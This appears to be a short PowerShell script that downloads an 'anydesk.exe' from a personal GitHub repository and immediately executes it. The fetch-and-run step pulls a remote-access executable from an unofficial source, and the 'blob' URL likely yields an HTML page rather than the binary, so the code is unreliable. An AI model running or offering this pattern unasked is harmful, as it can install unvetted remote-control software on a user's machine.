# Variables
$uri = "https://github.com/a2sembly/test/blob/main/anydesk.exe" # Replace with the actual URI
$outputFilePath = "C:\temp\anydesk.exe" # Replace with your desired file path

# Download and save the file
Invoke-WebRequest -Uri $uri -OutFile $outputFilePath

# Execute the downloaded file
Start-Process -FilePath $outputFilePath